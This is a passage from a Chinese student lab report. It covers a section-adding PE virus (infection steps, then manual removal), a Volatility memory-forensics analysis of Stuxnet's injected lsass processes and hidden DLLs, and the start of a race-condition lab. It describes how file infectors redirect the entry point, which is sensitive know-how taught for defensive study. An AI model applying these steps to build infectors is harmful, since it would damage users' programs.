<p>9、修改 <code>AddressOfEntryPoint</code>（即程序入口点指向病毒入口位置），同时保存旧的 <code>AddressOfEntryPoint</code>，以便返回宿主并继续执行。</p>
<p>10、更新 <code>SizeOfImage</code>（内存中整个<code>PE</code> 映像尺寸&#x3D;原 <code>SizeOfImage</code> +病毒节经过内存节对齐后的大小）。</p>
<p>11、写入感染标记（后面例子中是放在 <code>PE</code> 头中）。</p>
<p>12、在新添加的节中写入病毒代码。</p>
<p>示意图如下所示：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142545623.png" alt="image-20230107142545623"></p>
<p><strong>方法2：节扩展</strong></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142633871.png" alt="image-20230107142633871"></p>
<p><strong>方法3：节插入</strong>（利用空闲区修改PE）</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107142711345.png" alt="image-20230107142711345"></p>
<p>本实验中，我们对添加节方式感染型病毒进行分析，并进行手动清除病毒，使得PE文件恢复原貌。</p>
<h3 id="2-3-实验过程记录-3"><a href="#2-3-实验过程记录-3" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一-3"><a href="#（1）实验任务一-3" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>本实验提供了一个病毒样例，文件名为“添加节方式感染型病毒.exe”。</p>
<p>该病毒主要的工作流程如下：检索与该文件路径下的其他文件，若该文件为PE文件，那么就在该文件的末尾处添加一个病毒段.boy，然后在该段保存原程序的入口地址和基地址。并将原程序的入口地址（EP）改为.boy段的某处入口地址。病毒加载完之后，将控制权再次交给原程序。</p>
<p>任务描述： 加载病毒，执行感染。</p>
<p>1、为了学习病毒的感染过程，首先得明确被感染的程序的大致情况。用masm32加载提供给大家的test.asm，生成目标文件test.exe。</p>
<p>步骤是：</p>
<ul>
<li>编译源文件：Project-&gt;Assemble Asm File，产生***.obj文件；</li>
<li>Project-&gt;Link Obj File，链接产生的Obj文件，产生exe文件。</li>
</ul>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111212236886.png" alt="image-20230111212236886"></p>
<p>2、执行test.exe。程序很简单，弹窗显示1234，点击确定之后退出。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208211217044.png" alt="image-20221208211217044"></p>
<p><strong>使用stud_PE加载test.exe,查看信息</strong>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212101555.png" alt="image-20221208212101555"></p>
<p>注意到程序的入口地址为1015，程序的基址加载地址为400000。</p>
<p><strong>查看段表</strong>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212414460.png" alt="image-20221208212414460"></p>
<p>可以看到，test.exe中有三个段。</p>
<p>复制test.exe文件为test_infected.exe，并将test_infected.exe和病毒文件“添加节方式感染型病毒.exe”放在同一个新建的文件夹下。试验中新建的文件夹叫做“virus_lab”。此时该目录的文档结构如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212637229.png" alt="image-20221208212637229"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212650349.png" alt="image-20221208212650349"></p>
<p>可以看到test_infected.exe已经不是原来的文件了，程序已经被感染，在点击确定之后，原来的程序又恢复了正常运行的状态。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212712978.png" alt="image-20221208212712978"></p>
<h4 id="（2）实验任务二-3"><a href="#（2）实验任务二-3" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>通过对比分析感染过程。</p>
<p>用stud_PE加载test_infected.exe，查看段表。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208212806430.png" alt="image-20221208212806430"></p>
<p>和test.exe比对，发现被感染的文件多了一个段，该段名叫boy。该段的大小为204。从图标ep可以看出，这个段包含了程序的入口地址。</p>
<p>再看下头部信息，看到原EP发生了变化，而文件的大小也发生了变化，为4204。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213040023.png" alt="image-20221208213040023"></p>
<p>详细比较两文件不同。选择<strong>File Compare</strong>后，选择比对文件test.exe。对比方法为PE结构体对比。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213204007.png" alt="image-20221208213204007"></p>
<p>从图中可以看出，test_infected添加了一个section节。</p>
<p>继续往下比较，可以看出，程序的<strong>入口地址</strong>和<strong>大小</strong>都发生了变化。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213248274.png" alt="image-20221208213248274"></p>
<p>实际上，从被感染的程序上来看，病毒主要的工作是添加了一个段(.boy)，并将程序的入口地址重新定义到此段上去(AddressOfEntryPoint)。为了遵循PE格式，又必须让镜像大小(SizeOfImage)加上添加后的段(.boy)大小。</p>
<h4 id="（3）实验任务三-3"><a href="#（3）实验任务三-3" class="headerlink" title="（3）实验任务三"></a>（3）实验任务三</h4><p>根据感染原理，逆向清除病毒，恢复程序运行。</p>
<p>根据感染原理，其实只要将文件的EP改为之前的test.exe中的1015，即可恢复正常执行。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213616398.png" alt="image-20221208213616398"></p>
<p>保存：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213655265.png" alt="image-20221208213655265"></p>
<p>被保存之后，运行test_infected.exe。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213709665.png" alt="image-20221208213709665"></p>
<p>这样就完成了清理。</p>
<p>但是，从病毒感染的过程(添加段)来说，并没有将添加的段给删除，这也正是为什么会出现文件大小不一致。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213809879.png" alt="image-20221208213809879"></p>
<p>需要注意的是，为了更好地管理磁盘空间和更高效地从硬盘读取数据，操作系统规定一个簇中只能放置一个文件的内容，因此文件所占用的空间，只能是簇的整数倍；而如果文件实际大小小于一簇，它也要占一簇的空间。所以，一般情况下文件所占空间要略大于文件的实际大小，只有在少数情况下，即文件的实际大小恰好是簇的整数倍时，文件的实际大小才会与所占空间完全一致。</p>
<p>将添加的.boy段给删除了，我们使用PEditor来删除段。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208213931439.png" alt="image-20221208213931439"></p>
<p>选择删除段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214031736.png" alt="image-20221208214031736"></p>
<p>删除之后，段的数量会自动减一，不必修改NumberOfSections字段了。</p>
<p>删除之后退出程序，程序已经不能运行了。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214122649.png" alt="image-20221208214122649"></p>
<p>原因是删除了段之后，文件的sizeOfImage应该发生变化，所以应该减去.boy段的rawSize，也就是204，此时sizeOfImage的大小为4000。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214221419.png" alt="image-20221208214221419"></p>
<p>修改后再次运行，一切正常：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214247801.png" alt="image-20221208214247801"></p>
<p>此时来看下test_infected.exe的大小，从图中可以看出，test_infected.exe的大小没有改变。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214308573.png" alt="image-20221208214308573"></p>
<p>载入stud_pe查看一下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214356250.png" alt="image-20221208214356250"></p>
<p>可以看到，删除的是.boy段的段头信息，而段的内容还在此。</p>
<p>使用PEditor查看段表，却不存在此段。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214448063.png" alt="image-20221208214448063"></p>
<p>最好的方式是使用stud_PE来删除残骸，但是stud_PE在删除段时会报错。没关系，使用winhex来手动清除。</p>
<p>首先需要确定的是.boy段的RawOffset。.boy段之前存放在.data之后，.data的rawSize对齐之后为200，RawOffset为0x800.所以，.boy段的RawOffset为0xA00。</p>
<p>使用winhex打开test_infected.exe。移动到0xA00处。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214742194.png" alt="image-20221208214742194"></p>
<p>0xA00后就是.boy段的段内容，到结尾的字节长度为204，也即.boy段的RawOfSize。从右侧的字符串中我们也可以看到常量loadLibraryA和user32.dll等字符量。</p>
<p>选中0xA00到文件的末尾，删除，按Delete键。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214833799.png" alt="image-20221208214833799"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208214847487.png" alt="remove"></p>
<p>按Ctrl+S保存，运行该文件成功：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208215125852.png" alt="image-20221208215125852"></p>
<p>这时候再查看一下文件大小：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208215048357.png" alt="image-20221208215048357"></p>
<p>此时 <code>.boy</code> 段已经彻底的删除了。</p>
<h3 id="2-4-实验结果分析-3"><a href="#2-4-实验结果分析-3" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>PE病毒感染的三种方式包括节添加、节扩展、节插入。在本实验中，我们观察并分析了PE病毒感染后的文件及其变化，并进行手动清除，成功复原了源文件。</p>
<p>我们在实验中模拟的PE病毒主要实现的是弹窗机制，部分PE病毒还会将自己注册成为服务进程在后台隐藏运行，尝试连接网络，连接成功后会向指定的地址利用HTTP的方式下载文件到本地，并且还会拦截用户的操作，窃取指定软件的安全信息并保存在指定的文件中，然后利用FTP的方式将文件上传到指定的地址中，危害性极大。</p>
<h2 id="第三章-结论与心得-3"><a href="#第三章-结论与心得-3" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>PE病毒是以Windows PE程序为载体，能寄生于PE文件或Windows系统的病毒程序。通过本实验的实操，我对PE病毒的运行机理及感染和清除过程有了更加详细的认知。PE病毒编写的关键技术包括定位、获取API函数、搜索目标文件、感染、破坏等步骤，一旦被PE病毒感染，对计算机的影响将非常大，很多病毒还有连续感染即“蠕虫”的特性，我们必须防范此类病毒。</p>
<h1 id="实验五-Volatility：AnalyzingStuxnet01-选题15"><a href="#实验五-Volatility：AnalyzingStuxnet01-选题15" class="headerlink" title="实验五 Volatility：AnalyzingStuxnet01(选题15)"></a>实验五 Volatility：AnalyzingStuxnet01(选题15)</h1><h2 id="第一章-实验环境说明-4"><a href="#第一章-实验环境说明-4" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>本实验的操作系统环境是 <code>CentOS 7</code>，镜像文件是 <code>Win XP sp3</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-Volatility：AnalyzingStuxnet01实验过程"><a href="#第二章-Volatility：AnalyzingStuxnet01实验过程" class="headerlink" title="第二章 Volatility：AnalyzingStuxnet01实验过程"></a>第二章 Volatility：AnalyzingStuxnet01实验过程</h2><h3 id="2-1-实验任务及目的-4"><a href="#2-1-实验任务及目的-4" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：分析震网病毒的实现机制，学习Stuxnet恶意进程的执行思路和防治方法。</p>
<p><strong>实验目的</strong>：</p>
<ol>
<li>通过分析Stuxnet恶意进程，掌握恶意进程分析与防治的基本方法；</li>
<li>掌握分析DLL文件的基本方法。</li>
</ol>
<h3 id="2-2-实验方案设计-4"><a href="#2-2-实验方案设计-4" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：操作系统为 <code>CentOS 7</code>，实验所需的软件是 Volatility。</p>
<p><strong>实验原理</strong>：</p>
<p>震网（Stuxnet）病毒于2010年6月首次被检测出来，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。互联网安全专家对此表示担心。</p>
<p> 作为世界上首个网络“超级破坏性武器”，“震网”病毒利用了微软视窗操作系统之前未被发现的4个漏洞，Stuxnet的计算机病毒已经感染了全球超过 45000个网络，伊朗遭到的攻击最为严重，60%的个人电脑感染了这种病毒。计算机安防专家认为，该病毒是有史以来最高端的“蠕虫”病毒。蠕虫是一种典型的计算机病毒，它能自我复制，并将副本通过网络传输，任何一台个人电脑只要和染毒电脑相连，就会被感染。</p>
<p>下面的实验主要对震网病毒的实现机制做了基本的分析。</p>
<h3 id="2-3-实验过程记录-4"><a href="#2-3-实验过程记录-4" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一-4"><a href="#（1）实验任务一-4" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>1、Volatility基本使用命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py ‐f <span class="token punctuation">[</span>image<span class="token punctuation">]</span> ‐profile<span class="token operator">=</span><span class="token punctuation">[</span>profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>plugin<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中 <code>-f</code> 后面需要跟绝对路径。</p>
<p>查看扫描检查、插件、地址空间等信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py --info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看帮助信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py -h/--help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看指定插件的说明：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py <span class="token punctuation">[</span>plugin<span class="token punctuation">]</span> –help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查找插件：</p>
<p>不带前缀的是windows的插件，带linux前缀的是linux的插件</p>
<p><code>vol.py --info | grep -i linux</code> 命令列出所有linux插件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208215927227.png" alt="image-20221208215927227"></p>
<p>从扩展目录加载插件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py --plugins<span class="token operator">=</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">[</span>plugin<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>检查结果输出：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vol.py --output-file<span class="token operator">=</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>/etc/profile</code> 文件涉及到操作系统的环境，我们查看profile文件：<code>vol.py --info | grep -i profile</code></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208220027920.png" alt="image-20221208220027920"></p>
<p>2、确定要使用的profile文件</p>
<p>   在分析镜像文件之前，我们对拿到的镜像可能并不知道这些镜像是什么操作系统，所以我们需要先确定操作系统类型，从而选择正确的profile文件。</p>
<p>   待分析镜像：stuxnet.vmem</p>
<pre class="line-numbers language-none"><code class="language-none">ls | grep stuxnet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208220215093.png" alt="image-20221208220215093"></p>
<p>镜像信息查看参数：imageinfo</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py imageinfo -f stuxnet.vmem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208220337448.png" alt="image-20221208220337448"></p>
<p>从镜像信息分析出，需使用“WinXPSP3x86”这个profile。</p>
<p>分析Stuxnet进程</p>
<p>   基础知识：</p>
<p>   Lsass进程：</p>
<p>   lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。一个正常的windows xp系统在启动的时候，只会通过winlogon.exe创建一个lsass进程。</p>
<p>   <strong>Stuxnet会将自身注入到services.exe，然后创建两个新的lsass.exe</strong>，然后释放出mrxnet.sys（驱动）和Mrxcls.sys（驱动）等恶意文件。</p>
<p>   查看进程：</p>
<p>   查看进程插件：pstree</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py pstree -f stuxnet.vmem --profile&#x3D;WinXPSP3x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208221410240.png" alt="image-20221208221410240"></p>
<p>说明：</p>
<ul>
<li>PID：进程ID</li>
<li>PPID：父进程ID</li>
<li>HndsTime：进程创建时间</li>
</ul>
<p>由于调用了lsass.exe这个系统进程，因此在中毒机器内会看到至少3个lsass.exe进程。</p>
<p>其中一个lsass.exe是由winlogon.exe创建的，而另外两个则是由services创建的。</p>
<p>我们可以筛选一下，方便查看</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py pstree -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 | egrep &#39;(services.exe|lsass.exe|winlogon.exe)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208221511572.png" alt="image-20221208221511572"></p>
<p>正常的父子进程关系：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208221555788.png" alt="image-20221208221555788"></p>
<p>Stuxnet创建的进程父子关系：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208221609179.png" alt="image-20221208221609179"></p>
<p><strong>检查恶意链接</strong>：</p>
<p>我们检查链接插件：connections</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py connections -f stuxnet.vmem --profile&#x3D;WinXPSP3x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208221729091.png" alt="image-20221208221729091"></p>
<p>没有发现链接，我们试试查看进程监听的端口来判断恶意程序。</p>
<p><strong>检查端口插件</strong>： sockets</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py sockets -f stuxnet.vmem --profile&#x3D;WinXPSP3x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208222049685.png" alt="image-20221208222049685"></p>
<p>我们发现pid为680的lsass.exe监听了500和4500端口，而lsass监听500和4500端口是正常的。</p>
<p>但是pid 868 和pid 1928的两个lsass.exe 进程并没有监听任何端口，很是可疑，接着分析。</p>
<h4 id="（2）实验任务二-4"><a href="#（2）实验任务二-4" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>本任务是分析 <code>DLL</code> 文件。</p>
<h5 id="1、什么是DLL文件"><a href="#1、什么是DLL文件" class="headerlink" title="1、什么是DLL文件"></a>1、什么是DLL文件</h5><p>   DLL 是一个包含可由多个程序同时使用的代码和数据的库。简单来说，很多操作需要exe可执行文件调用dll文件才能完成。比如程序来实现“打开”对话框，可以调用Comdlg32 DLL 执行与对话框有关的常见函数。</p>
<h5 id="2、分析lsass-exe调用的dll文件"><a href="#2、分析lsass-exe调用的dll文件" class="headerlink" title="2、分析lsass.exe调用的dll文件"></a>2、分析lsass.exe调用的dll文件</h5><p>使用插件：<code>dlllist 参数：-p[pid] 过滤pid</code></p>
<p>我们发现，这两个可疑进程加载了很少的DLL文件。正常的lsass.exe(PID:680)调用了64个DLL文件，而另外两个可疑的进程分别调用了15个和35个DLL文件：</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py dlllist -p 680 -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 2&gt;&#x2F;dev&#x2F;null | wc -l
vol.py dlllist -p 868 -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 2&gt;&#x2F;dev&#x2F;null | wc -l
vol.py dlllist -p 1928 -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 2&gt;&#x2F;dev&#x2F;null | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208222619455.png" alt="image-20221208222619455"></p>
<p>此外我们可以<strong>使用ldrmodules找到隐藏的dll</strong></p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 ldrmodules -p 1928<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208223237719.png" alt="image-20221208223237719"></p>
<p>我们发现pid 1928有跟它未链接的DLL，而这些就是隐藏的DLL。</p>
<p>可以使用如下命令查看更多信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol.py -f stuxnet.vmem --profile<span class="token operator">=</span>WinXPSP3x86 ldrmodules -p <span class="token number">1928</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208223456475.png" alt="image-20221208223456475"></p>
<p>可以看到Stuxnet构建的名为”kernel32.dll.aslr.&lt;随机数字&gt;.dll”的文件。</p>
<p>Stuxnet利用Windows操作系统本身可以处理ASLR（缓冲区溢出的安全保护技术）的问题，将攻击代码以隐藏的方式加载到可执行内存中，精心构建名为”kernel32.dll.aslr.&lt;随机数字&gt;.dll”的文件，用来绕过ASLR。</p>
<h5 id="3、找出注入的可执行代码或者DLL"><a href="#3、找出注入的可执行代码或者DLL" class="headerlink" title="3、找出注入的可执行代码或者DLL"></a>3、找出注入的可执行代码或者DLL</h5><p>可以使用malfind找出注入的可执行代码和DLL</p>
<p>正常进程pid：680没有返回任何结果：</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 malfind -p 680<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208223650163.png" alt="image-20221208223650163"></p>
<p>但是接下来看 868和1928两个进程：</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 malfind -p 868
vol.py -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 malfind -p 1928<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208223713162.png" alt="image-20221208223713162"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208223811857.png" alt="image-20221208223811857"></p>
<p>发现了两个可疑的区域，在0x80000地址有两个进程，而且它们有PAGE_EXECUTE_READWRITE权限（正常的services.exe, lsass.exe不应该具有写权限）和MZ头，意味着PE可能存储在这里。</p>
<p>我们可以使用 -D DUMP_DIR, –dump-dir&#x3D;DUMP_DIR 参数导出找到隐藏代码或dll文件：</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f stuxnet.vmem --profile&#x3D;WinXPSP3x86 malfind -p 1928 -D out&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208224252922.png" alt="image-20221208224252922"></p>
<p>本实验环境无互联网，所以这里计算了文件的sha256sum值，然后去<a target="_blank" rel="noopener" href="http://www.virustotal.com/">http://www.virustotal.com</a> 按照sha256sum值搜索可以查看报告：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208224304570.png" alt="image-20221208224304570"></p>
<p>分析报告链接如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/e97d61f7393ac5838a1800f3e9aa22c6205f4d7e2bde494573d35c57bc9b7819/analysis/">https://www.virustotal.com/en/file/e97d61f7393ac5838a1800f3e9aa22c6205f4d7e2bde494573d35c57bc9b7819/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/163b7da37df4ae6dafbfb5bf88b319dabf7846cee73d4192c6a7593e835857a8/analysis/">https://www.virustotal.com/en/file/163b7da37df4ae6dafbfb5bf88b319dabf7846cee73d4192c6a7593e835857a8/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/abce3e79e26b5116fe7f3d40d21eaa4c8563e433b6086f9ec07c2925593f69dc/analysis/">https://www.virustotal.com/en/file/abce3e79e26b5116fe7f3d40d21eaa4c8563e433b6086f9ec07c2925593f69dc/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/2b2945f7cc7cf5b30ccdf37e2adbb236594208e409133bcd56f57f7c009ffe6d/analysis/">https://www.virustotal.com/en/file/2b2945f7cc7cf5b30ccdf37e2adbb236594208e409133bcd56f57f7c009ffe6d/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/10f07b9fbbc6a8c6dc4abf7a3d31a01e478accd115b33ec94fe885cb296a3586/analysis/">https://www.virustotal.com/en/file/10f07b9fbbc6a8c6dc4abf7a3d31a01e478accd115b33ec94fe885cb296a3586/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/a4b4b29f0df45283b629203b080c09ddb5bc6eb4cd8e9b725f75121a8b7e728e/analysis/">https://www.virustotal.com/en/file/a4b4b29f0df45283b629203b080c09ddb5bc6eb4cd8e9b725f75121a8b7e728e/analysis/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/en/file/2b2945f7cc7cf5b30ccdf37e2adbb236594208e409133bcd56f57f7c009ffe6d/analysis/">https://www.virustotal.com/en/file/2b2945f7cc7cf5b30ccdf37e2adbb236594208e409133bcd56f57f7c009ffe6d/analysis/</a></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208224332955.png" alt="image-20221208224332955"></p>
<h3 id="2-4-实验结果分析-4"><a href="#2-4-实验结果分析-4" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>通过对Stuxnet蠕虫病毒的分析，我们发现，该病毒存在恶意进程，且加载了隐藏的dll文件，利用Windows操作系统本身可以处理ASLR的问题，将攻击代码以隐藏的方式加载到可执行内存中，实现对恶意代码在受害机中的执行。</p>
<h2 id="第三章-结论与心得-4"><a href="#第三章-结论与心得-4" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>Stuxnet蠕虫病毒（超级工厂病毒）是世界上首个专门针对工业控制系统编写的破坏性病毒，能够利用对windows系统和西门子SIMATIC WinCC系统的7个漏洞进行攻击。通过本实验对Stuxnet蠕虫病毒的分析，我掌握了该蠕虫病毒的实现机理和分析一般dll文件的基本方法，我会在以后的学习中将这个实验中学习到的恶意代码分析方法加以运用。</p>
<h1 id="实验六-竞态条件漏洞实验-选题18"><a href="#实验六-竞态条件漏洞实验-选题18" class="headerlink" title="实验六 竞态条件漏洞实验(选题18)"></a>实验六 竞态条件漏洞实验(选题18)</h1><h2 id="第一章-实验环境说明-5"><a href="#第一章-实验环境说明-5" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>本实验的操作系统环境是 <code>Ubuntu 16.04</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-竞态条件漏洞实验过程"><a href="#第二章-竞态条件漏洞实验过程" class="headerlink" title="第二章 竞态条件漏洞实验过程"></a>第二章 竞态条件漏洞实验过程</h2><h3 id="2-1-实验任务及目的-5"><a href="#2-1-实验任务及目的-5" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：</p>
<ol>
<li>构造具有竞态条件漏洞的程序；</li>
<li>对具有竞态条件漏洞的程序进行利用与提权；</li>
<li>设计抵御竞态条件攻击的方法。</li>
</ol>
<p><strong>实验目的</strong>：</p>
<ol>
<li>熟悉竞态条件漏洞的产生原理、利用方式；</li>
<li>学习如何制定保护方案抵御竞态条件攻击。</li>
</ol>
<h3 id="2-2-实验方案设计-5"><a href="#2-2-实验方案设计-5" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：操作系统环境是 <code>Ubuntu 16.04</code>，实验所需的文件包括具有竞态条件漏洞的程序、攻击程序等。</p>
<p><strong>实验原理</strong>：</p>
<p>竞态条件（race condition），从多进程间通信的角度来讲，是指两个或多个进程对共享的数据进行读或写的操作时，最终的结果取决于这些进程的执行顺序。</p>
<p>执行依赖于检测的结果，而检测结果依赖于多个线程的执行时序，而多个线程的执行时序通常情况下是不固定不可判断的，从而导致执行结果出现各种问题。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109235240477.png" alt="image-20230109235240477"></p>
<p>在以上的示意图中，对于main线程，如果文件a不存在，则创建文件a，但是在判断文件a不存在之后，Task线程创建了文件a，这时候先前的判断结果已经失效，（main线程的执行依赖了一个错误的判断结果）此时文件a已经存在了，但是main线程还是会继续创建文件a，导致Task线程创建的文件a被覆盖、文件中的内容丢失等问题。</p>
